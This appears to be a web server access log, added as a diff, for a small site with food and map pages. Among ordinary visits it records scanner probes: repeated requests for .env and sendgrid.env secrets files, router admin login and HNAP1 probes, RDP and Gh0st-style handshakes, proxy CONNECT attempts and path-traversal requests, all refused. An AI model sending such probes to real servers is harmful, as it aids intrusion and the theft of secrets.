+5.188.210.227 - - [09/Dec/2022 14:12:01] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+5.188.210.227 - - [09/Dec/2022 14:12:01] " P¼Òã " HTTPStatus.BAD_REQUEST -
+5.188.210.227 - - [09/Dec/2022 14:12:09] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 -
+184.105.247.212 - - [09/Dec/2022 14:14:15] "GET /favicon.ico HTTP/1.1" 404 -
+95.214.235.205 - - [09/Dec/2022 14:45:35] "GET /.env HTTP/1.1" 404 -
+95.214.235.205 - - [09/Dec/2022 14:45:35] "POST / HTTP/1.1" 405 -
+35.195.93.98 - - [09/Dec/2022 14:49:03] "GET / HTTP/1.1" 200 -
+84.21.172.205 - - [09/Dec/2022 15:36:17] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+135.125.217.54 - - [09/Dec/2022 15:54:18] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [09/Dec/2022 15:54:19] "GET /.env HTTP/1.1" 404 -
+192.155.90.220 - - [09/Dec/2022 16:00:36] code 400, message Bad request version ('À\x14À')
+192.155.90.220 - - [09/Dec/2022 16:00:36] "   Mç´ó|ð'GLÎ¿ø"dóF >&âQQÑ¦ÐíE4WE   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+44.202.238.137 - - [09/Dec/2022 16:09:00] "GET / HTTP/1.1" 200 -
+198.235.24.141 - - [09/Dec/2022 16:29:04] "GET / HTTP/1.1" 200 -
+185.254.196.115 - - [09/Dec/2022 17:05:11] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [09/Dec/2022 17:05:12] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [09/Dec/2022 17:06:38] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [09/Dec/2022 17:06:38] "GET /.env HTTP/1.1" 404 -
+210.220.70.255 - - [09/Dec/2022 17:38:54] "GET / HTTP/1.1" 200 -
+95.214.235.205 - - [09/Dec/2022 17:46:27] "GET /.env HTTP/1.1" 404 -
+157.245.203.107 - - [09/Dec/2022 17:54:37] "GET / HTTP/1.0" 200 -
+112.152.36.226 - - [09/Dec/2022 19:00:36] "GET / HTTP/1.1" 200 -
+112.152.36.226 - - [09/Dec/2022 19:00:37] "GET /static/css/reset.css HTTP/1.1" 304 -
+112.152.36.226 - - [09/Dec/2022 19:00:37] "GET /static/css/style.css HTTP/1.1" 200 -
+112.152.36.226 - - [09/Dec/2022 19:00:37] "GET /static/js/index.js HTTP/1.1" 200 -
+112.152.36.226 - - [09/Dec/2022 19:00:37] "GET /static/assets/search.png HTTP/1.1" 200 -
+112.152.36.226 - - [09/Dec/2022 19:00:37] "GET /static/assets/like.png HTTP/1.1" 200 -
+112.152.36.226 - - [09/Dec/2022 19:00:37] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+112.152.36.226 - - [09/Dec/2022 19:00:37] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+112.152.36.226 - - [09/Dec/2022 19:00:37] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+112.152.36.226 - - [09/Dec/2022 19:00:37] "GET /static/assets/call.png HTTP/1.1" 304 -
+112.152.36.226 - - [09/Dec/2022 19:00:41] "GET /Good_Say HTTP/1.1" 200 -
+121.53.83.250 - - [09/Dec/2022 19:02:20] "GET / HTTP/1.1" 200 -
+51.120.3.88 - - [09/Dec/2022 19:06:59] "GET / HTTP/1.1" 200 -
+51.120.3.88 - - [09/Dec/2022 19:06:59] "GET /_profiler/empty/search/results HTTP/1.1" 404 -
+154.89.5.101 - - [09/Dec/2022 19:08:34] "GET / HTTP/1.1" 200 -
+91.121.59.189 - - [09/Dec/2022 19:10:33] "GET /.env HTTP/1.1" 404 -
+91.121.59.189 - - [09/Dec/2022 19:10:33] "POST / HTTP/1.1" 405 -
+91.121.59.189 - - [09/Dec/2022 19:10:34] "POST /core/.env HTTP/1.1" 404 -
+91.121.59.189 - - [09/Dec/2022 19:10:34] "GET /core/.env HTTP/1.1" 404 -
+91.121.59.189 - - [09/Dec/2022 19:10:35] "POST / HTTP/1.1" 405 -
+91.121.59.189 - - [09/Dec/2022 19:10:35] "POST /core/.env HTTP/1.1" 404 -
+95.214.235.205 - - [09/Dec/2022 19:12:14] "GET /.env HTTP/1.1" 404 -
+135.125.217.54 - - [09/Dec/2022 19:20:19] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [09/Dec/2022 19:20:20] "GET /.env HTTP/1.1" 404 -
+45.79.128.205 - - [09/Dec/2022 19:48:39] code 400, message Bad request version ('À\x14À')
+45.79.128.205 - - [09/Dec/2022 19:48:39] "   t÷ï²Ù 	Äfë¨E¯nx®Û··Ë¢-B9Í   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+135.125.217.54 - - [09/Dec/2022 20:26:36] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [09/Dec/2022 20:26:36] "GET /.env HTTP/1.1" 404 -
+220.64.104.0 - - [09/Dec/2022 20:38:23] "GET / HTTP/1.1" 200 -
+95.214.235.205 - - [09/Dec/2022 20:58:58] "GET /.env HTTP/1.1" 404 -
+95.214.235.205 - - [09/Dec/2022 20:58:59] "POST / HTTP/1.1" 405 -
+167.71.12.145 - - [09/Dec/2022 21:31:53] "GET / HTTP/1.1" 200 -
+45.79.181.223 - - [09/Dec/2022 21:59:43] code 400, message Bad request version ('À\x14À')
+45.79.181.223 - - [09/Dec/2022 21:59:43] "   £Xù¦º¤zi^Ý"¦oZ%FìÛ.ÝÐ®ÕÞ¡   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+135.125.217.54 - - [09/Dec/2022 22:26:27] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [09/Dec/2022 22:26:28] "GET /.env HTTP/1.1" 404 -
+109.237.97.180 - - [09/Dec/2022 22:33:32] "GET /.env HTTP/1.1" 404 -
+109.237.97.180 - - [09/Dec/2022 22:33:32] code 400, message Bad request version ('\x98ìÞ')
+109.237.97.180 - - [09/Dec/2022 22:33:32] "H DJ16$E­²Ho3ýo¹V}#àýÇHÆ@;nÄè¬` É«wa =Õ² Á@7»3 ìÞ" HTTPStatus.BAD_REQUEST -
+183.96.80.196 - - [09/Dec/2022 22:39:13] "GET / HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:13] "GET /static/css/style.css HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:13] "GET /static/css/reset.css HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:13] "GET /static/js/index.js HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:13] "GET /static/assets/search.png HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:13] "GET /static/assets/like.png HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:13] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:13] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:13] "GET /static/assets/call.png HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:13] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:14] "GET /static/assets/house.svg HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:14] "GET /static/assets/house.svg HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:14] "GET /Good_Say HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:15] "GET /map HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:15] "GET /static/css/reset.css HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:15] "GET /static/css/header.css HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:15] "GET /static/css/map.css HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:15] "GET /static/assets/search2.png HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:15] "GET /static/assets/like2.png HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:15] "GET /static/assets/mypage2.png HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:15] "GET / HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:15] "GET /favicon.ico HTTP/1.1" 404 -
+183.96.80.196 - - [09/Dec/2022 22:39:16] "GET /static/css/style.css HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:16] "GET /static/css/reset.css HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:16] "GET /static/js/index.js HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:16] "GET /static/assets/search.png HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:16] "GET /static/assets/like.png HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:16] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:16] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:16] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:16] "GET /static/assets/call.png HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:16] "GET /static/assets/house.svg HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:16] "GET /static/assets/house.svg HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:16] "GET /Good_Say HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:17] "GET /map HTTP/1.1" 200 -
+183.96.80.196 - - [09/Dec/2022 22:39:17] "GET /static/css/header.css HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:17] "GET /static/css/reset.css HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:17] "GET /static/css/map.css HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:17] "GET /static/assets/search2.png HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:17] "GET /static/assets/like2.png HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:17] "GET /static/assets/mypage2.png HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:17] "GET /favicon.ico HTTP/1.1" 404 -
+183.96.80.196 - - [09/Dec/2022 22:39:23] "GET /static/assets/house.svg HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:23] "GET /static/assets/house.svg HTTP/1.1" 304 -
+183.96.80.196 - - [09/Dec/2022 22:39:23] "GET /Good_Say HTTP/1.1" 200 -
+185.254.196.115 - - [09/Dec/2022 22:40:50] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [09/Dec/2022 22:40:51] "POST / HTTP/1.1" 405 -
+176.58.127.141 - - [09/Dec/2022 23:39:39] "GET / HTTP/1.1" 200 -
+135.125.217.54 - - [09/Dec/2022 23:44:37] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [09/Dec/2022 23:44:38] "GET /.env HTTP/1.1" 404 -
+95.214.235.205 - - [09/Dec/2022 23:48:18] "GET /.env HTTP/1.1" 404 -
+95.214.235.205 - - [09/Dec/2022 23:48:19] "POST / HTTP/1.1" 405 -
+104.131.161.59 - - [10/Dec/2022 00:03:32] "GET / HTTP/1.0" 200 -
+45.79.172.21 - - [10/Dec/2022 00:11:49] code 400, message Bad request version ('À\x14À')
+45.79.172.21 - - [10/Dec/2022 00:11:49] "   TývM7ÜåØÅæ,Îñà`'G»7,Hdbñµ   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+192.241.201.86 - - [10/Dec/2022 00:29:19] code 400, message Bad request syntax ('MGLNDD_3.34.125.70_80')
+192.241.201.86 - - [10/Dec/2022 00:29:19] "MGLNDD_3.34.125.70_80" HTTPStatus.BAD_REQUEST -
+4.231.217.15 - - [10/Dec/2022 00:34:40] "GET /.env HTTP/1.1" 404 -
+193.35.18.223 - - [10/Dec/2022 00:53:20] "CONNECT discordapp.com:443 HTTP/1.1" 404 -
+59.99.192.129 - - [10/Dec/2022 01:08:03] "POST /HNAP1/ HTTP/1.0" 404 -
+45.227.254.54 - - [10/Dec/2022 01:15:20] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+45.227.254.54 - - [10/Dec/2022 01:15:20] "  /*à     Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+135.125.217.54 - - [10/Dec/2022 01:19:15] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [10/Dec/2022 01:19:15] "GET /.env HTTP/1.1" 404 -
+92.255.85.173 - - [10/Dec/2022 01:21:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+92.255.85.173 - - [10/Dec/2022 01:21:11] "  /*à     Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+192.155.90.220 - - [10/Dec/2022 01:51:06] code 400, message Bad request version ('ÔäñL')
+192.155.90.220 - - [10/Dec/2022 01:51:06] "   A¡óõhÔäñL" HTTPStatus.BAD_REQUEST -
+20.198.65.92 - - [10/Dec/2022 01:51:50] "GET /.env HTTP/1.1" 404 -
+20.198.65.92 - - [10/Dec/2022 01:51:51] "POST / HTTP/1.1" 405 -
+104.131.161.59 - - [10/Dec/2022 01:59:19] "GET / HTTP/1.1" 200 -
+104.131.161.59 - - [10/Dec/2022 01:59:20] "GET /static/assets/house.svg HTTP/1.1" 200 -
+185.254.196.115 - - [10/Dec/2022 02:02:19] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [10/Dec/2022 02:02:20] "POST / HTTP/1.1" 405 -
+152.89.196.54 - - [10/Dec/2022 02:31:31] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+152.89.196.54 - - [10/Dec/2022 02:31:31] "  ,'à     Cookie: mstshash=Domain" HTTPStatus.BAD_REQUEST -
+152.89.196.54 - - [10/Dec/2022 02:31:32] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+152.89.196.54 - - [10/Dec/2022 02:31:32] "  ,'à     Cookie: mstshash=Domain" HTTPStatus.BAD_REQUEST -
+135.125.217.54 - - [10/Dec/2022 02:33:18] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [10/Dec/2022 02:33:19] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [10/Dec/2022 03:02:12] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [10/Dec/2022 03:02:12] "POST / HTTP/1.1" 405 -
+167.94.138.120 - - [10/Dec/2022 03:07:08] "GET / HTTP/1.1" 200 -
+167.94.138.120 - - [10/Dec/2022 03:07:08] "GET / HTTP/1.1" 200 -
+167.94.138.120 - - [10/Dec/2022 03:07:08] code 505, message Invalid HTTP version (2.0)
+167.94.138.120 - - [10/Dec/2022 03:07:08] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.94.138.120 - - [10/Dec/2022 03:07:09] "GET /../static/assets/house.svg HTTP/1.1" 404 -
+167.94.138.120 - - [10/Dec/2022 03:07:09] "GET /../static/assets/house.svg HTTP/1.1" 404 -
+167.94.138.120 - - [10/Dec/2022 03:07:10] "GET /favicon.ico HTTP/1.1" 404 -
+66.175.213.4 - - [10/Dec/2022 03:52:22] code 400, message Bad request version ('À\x14À')
+66.175.213.4 - - [10/Dec/2022 03:52:22] "   PPNÌ)ñÇj)BPJå_CÒ±V}±çáÝ¤   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+34.78.6.216 - - [10/Dec/2022 04:22:01] "GET / HTTP/1.1" 200 -
+205.210.31.171 - - [10/Dec/2022 04:55:30] "GET / HTTP/1.1" 200 -
+135.125.217.54 - - [10/Dec/2022 04:58:14] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [10/Dec/2022 04:58:15] "GET /.env HTTP/1.1" 404 -
+192.241.205.235 - - [10/Dec/2022 05:21:38] "GET /portal/redlion HTTP/1.1" 404 -
+192.241.194.196 - - [10/Dec/2022 05:31:47] "GET /actuator/health HTTP/1.1" 404 -
+95.214.235.205 - - [10/Dec/2022 05:39:25] "GET /.env HTTP/1.1" 404 -
+95.214.235.205 - - [10/Dec/2022 05:39:26] "POST / HTTP/1.1" 405 -
+45.79.181.104 - - [10/Dec/2022 05:56:16] code 400, message Bad request version ('À\x14À')
+45.79.181.104 - - [10/Dec/2022 05:56:16] "   çüËyÍ¢ªæ+ÛúÔÿ¾í8a<WÕÁãÅÊ   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+23.251.102.90 - - [10/Dec/2022 05:58:17] "GET / HTTP/1.1" 200 -
+23.251.102.90 - - [10/Dec/2022 05:58:18] "GET /showLogin.cc HTTP/1.1" 404 -
+135.125.217.54 - - [10/Dec/2022 06:05:05] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [10/Dec/2022 06:05:05] "GET /.env HTTP/1.1" 404 -
+185.142.236.41 - - [10/Dec/2022 07:20:05] "GET / HTTP/1.1" 200 -
+185.142.236.41 - - [10/Dec/2022 07:20:06] "GET /robots.txt HTTP/1.1" 404 -
+185.142.236.41 - - [10/Dec/2022 07:20:08] "GET /sitemap.xml HTTP/1.1" 404 -
+172.105.128.13 - - [10/Dec/2022 07:54:48] code 400, message Bad request version ('À\x14À')
+172.105.128.13 - - [10/Dec/2022 07:54:48] "   Ì£ÒÁÕ³VùÍûx	»YÉ[ø¤ö¼©tD   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+135.125.217.54 - - [10/Dec/2022 08:06:20] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [10/Dec/2022 08:06:21] "GET /.env HTTP/1.1" 404 -
+84.21.172.205 - - [10/Dec/2022 08:19:23] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+162.142.125.9 - - [10/Dec/2022 08:55:44] "GET / HTTP/1.1" 200 -
+162.142.125.9 - - [10/Dec/2022 08:55:44] "GET / HTTP/1.1" 200 -
+162.142.125.9 - - [10/Dec/2022 08:55:45] code 505, message Invalid HTTP version (2.0)
+162.142.125.9 - - [10/Dec/2022 08:55:45] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+162.142.125.9 - - [10/Dec/2022 08:55:45] "GET /../static/assets/house.svg HTTP/1.1" 404 -
+162.142.125.9 - - [10/Dec/2022 08:55:45] "GET /../static/assets/house.svg HTTP/1.1" 404 -
+162.142.125.9 - - [10/Dec/2022 08:55:46] "GET /favicon.ico HTTP/1.1" 404 -
+4.231.217.15 - - [10/Dec/2022 09:04:44] "GET /.env HTTP/1.1" 404 -
+95.214.235.205 - - [10/Dec/2022 09:16:58] "GET /.env HTTP/1.1" 404 -
+95.214.235.205 - - [10/Dec/2022 09:16:58] "POST / HTTP/1.1" 405 -
+112.152.36.226 - - [10/Dec/2022 09:22:20] "GET / HTTP/1.1" 200 -
+112.152.36.226 - - [10/Dec/2022 09:22:22] "GET /static/css/reset.css HTTP/1.1" 304 -
+112.152.36.226 - - [10/Dec/2022 09:22:22] "GET /static/css/style.css HTTP/1.1" 304 -
+112.152.36.226 - - [10/Dec/2022 09:22:22] "GET /static/js/index.js HTTP/1.1" 304 -
+112.152.36.226 - - [10/Dec/2022 09:22:22] "GET /static/assets/search.png HTTP/1.1" 304 -
+112.152.36.226 - - [10/Dec/2022 09:22:22] "GET /static/assets/like.png HTTP/1.1" 304 -
+112.152.36.226 - - [10/Dec/2022 09:22:22] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+112.152.36.226 - - [10/Dec/2022 09:22:23] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+112.152.36.226 - - [10/Dec/2022 09:22:23] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+112.152.36.226 - - [10/Dec/2022 09:22:23] "GET /static/assets/call.png HTTP/1.1" 304 -
+112.152.36.226 - - [10/Dec/2022 09:22:25] "GET /Good_Say HTTP/1.1" 200 -
+162.221.192.26 - - [10/Dec/2022 09:23:26] "GET / HTTP/1.1" 200 -
+135.125.217.54 - - [10/Dec/2022 09:25:40] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [10/Dec/2022 09:25:40] "GET /.env HTTP/1.1" 404 -
+172.104.11.34 - - [10/Dec/2022 09:52:34] code 400, message Bad request version ('À\x14À')
+172.104.11.34 - - [10/Dec/2022 09:52:34] "   Bùêm]CR@É$únw#´´ÀÑw2É4Ñô   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+198.235.24.139 - - [10/Dec/2022 10:34:39] "GET / HTTP/1.1" 200 -
+198.235.24.8 - - [10/Dec/2022 10:51:17] code 400, message Bad request syntax ('\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03÷\x9cC\x00\x98Vüî')
+198.235.24.8 - - [10/Dec/2022 10:51:17] " Ê  Æ÷C Vüî" HTTPStatus.BAD_REQUEST -
+135.125.217.54 - - [10/Dec/2022 11:06:13] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [10/Dec/2022 11:06:13] "GET /.env HTTP/1.1" 404 -
+84.21.172.128 - - [10/Dec/2022 11:17:15] "GET / HTTP/1.1" 200 -
+87.236.176.246 - - [10/Dec/2022 11:34:05] "GET / HTTP/1.1" 200 -
+87.236.176.37 - - [10/Dec/2022 11:34:07] "GET /static/assets/house.svg HTTP/1.1" 200 -
+135.125.217.54 - - [10/Dec/2022 11:50:36] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [10/Dec/2022 11:50:37] "GET /.env HTTP/1.1" 404 -
+192.155.90.220 - - [10/Dec/2022 12:05:50] code 400, message Bad request version ('À\x14À')
+192.155.90.220 - - [10/Dec/2022 12:05:50] "   aWâ`Zë©Øáÿú((0¸äÍ$xï]PÕ÷   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+205.210.31.152 - - [10/Dec/2022 12:12:24] "GET / HTTP/1.0" 200 -
+205.210.31.180 - - [10/Dec/2022 12:17:47] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03Ñ+\x7fàÝ¼Ð\x88é¢È¯ñ#`E,±kÐQ\x7fdKÅ\x99%4?òÖC\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+205.210.31.180 - - [10/Dec/2022 12:17:47] " Ê  ÆÑ+àÝ¼Ðé¢È¯ñ#`E,±kÐQdKÅ%4?òÖC  hÌÌÀ/À+À0À,ÀÀÀ'À#ÀÀ	À(À$ÀÀ" HTTPStatus.BAD_REQUEST -
+183.136.225.32 - - [10/Dec/2022 12:19:03] "GET / HTTP/1.1" 200 -
+183.136.225.32 - - [10/Dec/2022 12:20:18] "GET /static/assets/house.svg HTTP/1.1" 200 -
+183.136.225.32 - - [10/Dec/2022 12:20:18] "GET /robots.txt HTTP/1.1" 404 -
+183.136.225.32 - - [10/Dec/2022 12:20:30] "GET /static/js/index.js HTTP/1.1" 200 -
+206.84.21.211 - - [10/Dec/2022 12:21:48] "GET / HTTP/1.1" 200 -
+206.84.21.211 - - [10/Dec/2022 12:21:49] "GET /HNAP1/ HTTP/1.1" 404 -
+192.241.195.72 - - [10/Dec/2022 13:04:55] "GET / HTTP/1.1" 200 -
+185.254.196.115 - - [10/Dec/2022 13:10:51] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [10/Dec/2022 13:10:52] "POST / HTTP/1.1" 405 -
+85.31.44.156 - - [10/Dec/2022 13:15:03] "GET / HTTP/1.1" 200 -
+135.125.217.54 - - [10/Dec/2022 13:41:17] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [10/Dec/2022 13:41:18] "GET /.env HTTP/1.1" 404 -
+172.104.11.34 - - [10/Dec/2022 13:57:41] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00')
+172.104.11.34 - - [10/Dec/2022 13:57:41] "   a°á" HTTPStatus.BAD_REQUEST -
+85.31.44.146 - - [10/Dec/2022 13:58:54] "GET /sendgrid.env HTTP/1.1" 404 -
+85.31.44.146 - - [10/Dec/2022 13:58:57] "GET /.env HTTP/1.1" 404 -
+35.233.62.116 - - [10/Dec/2022 14:26:58] "GET / HTTP/1.1" 200 -
+167.248.133.117 - - [10/Dec/2022 14:37:36] "GET / HTTP/1.1" 200 -
+167.248.133.117 - - [10/Dec/2022 14:37:36] "GET / HTTP/1.1" 200 -
+167.248.133.117 - - [10/Dec/2022 14:37:37] code 505, message Invalid HTTP version (2.0)
+167.248.133.117 - - [10/Dec/2022 14:37:37] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.248.133.117 - - [10/Dec/2022 14:37:37] "GET /../static/assets/house.svg HTTP/1.1" 404 -
+167.248.133.117 - - [10/Dec/2022 14:37:37] "GET /../static/assets/house.svg HTTP/1.1" 404 -
+167.248.133.117 - - [10/Dec/2022 14:37:37] "GET /favicon.ico HTTP/1.1" 404 -
+185.180.143.136 - - [10/Dec/2022 14:44:58] "GET / HTTP/1.1" 200 -
+135.125.217.54 - - [10/Dec/2022 14:53:36] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [10/Dec/2022 14:53:36] "GET /.env HTTP/1.1" 404 -
+85.31.44.156 - - [10/Dec/2022 15:48:22] "GET / HTTP/1.1" 200 -
+45.227.254.54 - - [10/Dec/2022 15:54:38] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+45.227.254.54 - - [10/Dec/2022 15:54:38] "  /*à     Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+34.168.227.26 - - [10/Dec/2022 16:45:23] "GET /.env HTTP/1.1" 404 -
+135.125.246.110 - - [10/Dec/2022 16:56:22] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [10/Dec/2022 16:56:23] "GET /.env HTTP/1.1" 404 -
+210.220.79.0 - - [10/Dec/2022 17:29:38] "GET / HTTP/1.1" 200 -
+135.125.246.110 - - [10/Dec/2022 17:38:15] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [10/Dec/2022 17:38:16] "GET /.env HTTP/1.1" 404 -
+172.104.11.34 - - [10/Dec/2022 17:49:28] code 400, message Bad request version ('À\x14À')
+172.104.11.34 - - [10/Dec/2022 17:49:28] "   ç{6«zÐÆKíÜ®!FT	040þ ;£    À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+167.94.146.60 - - [10/Dec/2022 17:53:55] "GET / HTTP/1.1" 200 -
+167.94.146.60 - - [10/Dec/2022 17:53:56] "GET / HTTP/1.1" 200 -
+167.94.146.60 - - [10/Dec/2022 17:53:56] code 505, message Invalid HTTP version (2.0)
+167.94.146.60 - - [10/Dec/2022 17:53:56] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.94.146.60 - - [10/Dec/2022 17:53:57] "GET /../static/assets/house.svg HTTP/1.1" 404 -
+167.94.146.60 - - [10/Dec/2022 17:53:57] "GET /../static/assets/house.svg HTTP/1.1" 404 -
+167.94.146.60 - - [10/Dec/2022 17:53:58] "GET /favicon.ico HTTP/1.1" 404 -
+92.255.85.173 - - [10/Dec/2022 19:02:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+92.255.85.173 - - [10/Dec/2022 19:02:11] "  /*à     Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
+13.52.180.105 - - [10/Dec/2022 19:21:39] "GET / HTTP/1.1" 200 -
+13.52.180.105 - - [10/Dec/2022 19:21:55] "GET /static/js/index.js HTTP/1.1" 200 -
+13.52.180.105 - - [10/Dec/2022 19:22:02] "GET /dapi.kakao.com/v2/maps/sdk.js HTTP/1.1" 404 -
+13.52.180.105 - - [10/Dec/2022 19:22:02] "GET /ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js HTTP/1.1" 404 -
+13.52.180.105 - - [10/Dec/2022 19:22:02] "GET /static/js/index.js HTTP/1.1" 200 -
+13.52.180.105 - - [10/Dec/2022 19:22:02] "GET /kit.fontawesome.com/80a9730165.js HTTP/1.1" 404 -
+135.125.246.110 - - [10/Dec/2022 19:23:53] "POST / HTTP/1.1" 405 -
+135.125.246.110 - - [10/Dec/2022 19:23:54] "GET /.env HTTP/1.1" 404 -
+66.240.205.34 - - [10/Dec/2022 19:33:35] code 400, message Bad request version ('®¯]')
+66.240.205.34 - - [10/Dec/2022 19:33:35] "Gh0st­   à   xKS``ÃÀÀÀÄ@¼Q	H§e&§*$&g+2ö°00¬¨rc  \`&ÇK7ån9n;3¬èsch¨^Ï4'J©ã0Ãh]&øÎSËA4L?2=áÄ@õ`T®¯]" HTTPStatus.BAD_REQUEST -
+95.214.235.205 - - [10/Dec/2022 19:41:31] "GET /.env HTTP/1.1" 404 -
